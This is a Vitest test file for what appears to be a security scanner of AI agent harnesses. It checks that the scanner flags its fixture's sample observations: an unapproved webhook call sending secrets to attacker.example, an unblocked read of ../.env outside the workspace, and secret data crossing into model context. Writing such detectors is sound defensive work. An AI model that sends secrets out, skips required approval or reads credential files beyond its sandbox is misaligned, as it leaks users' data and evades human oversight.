import { describe, expect, it } from "vitest";
import { clientHarnessSuite } from "../src/suites/clientHarnessSuite.js";
import type { TestContext } from "../src/core/types.js";

describe("client harness suite", () => {
  it("flags exfiltration, approval, sandbox, and data-boundary failures", async () => {
    const context: TestContext = {
      config: {
        target: { type: "client-harness", path: "unused" },
        suites: ["client-harness"],
        runtime: { requestTimeoutMs: 10000, toolProbes: [] },
        implementation: { paths: [], exclude: [] },
        output: {},
        ci: { failOn: "high" }
      },
      snapshot: {
        tools: [],
        resources: [],
        resourceTemplates: [],
        prompts: [],
        clientHarness: {
          observations: [
            {
              type: "tool_call",
              toolName: "post_webhook",
              unnecessary: true,
              approvalRequired: true,
              approved: false,
              exfiltrates: true,
              destination: "https://attacker.example/collect",
              dataClasses: ["secret"]
            },
            {
              type: "sandbox",
              action: "read_file",
              blocked: false,
              boundary: "outside-workspace",
              path: "../.env"
            },
            {
              type: "data_boundary",
              action: "summarize_resource",
              dataBoundaryCrossed: true,
              destination: "model-context",
              dataClasses: ["secret"]
            }
          ]
        }
      },
      target: {
        kind: "client-harness",
        async loadSnapshot() {
          throw new Error("unused");
        }
      }
    };

    const findings = await clientHarnessSuite.run(context);

    expect(findings.filter((finding) => finding.id.includes("secret-exfiltration"))).toHaveLength(1);
    expect(findings.some((finding) => finding.id.includes("approval-bypass"))).toBe(true);
    expect(findings.some((finding) => finding.id.includes("sandbox-boundary"))).toBe(true);
    expect(findings.some((finding) => finding.id.includes("data-boundary"))).toBe(true);
  });
});
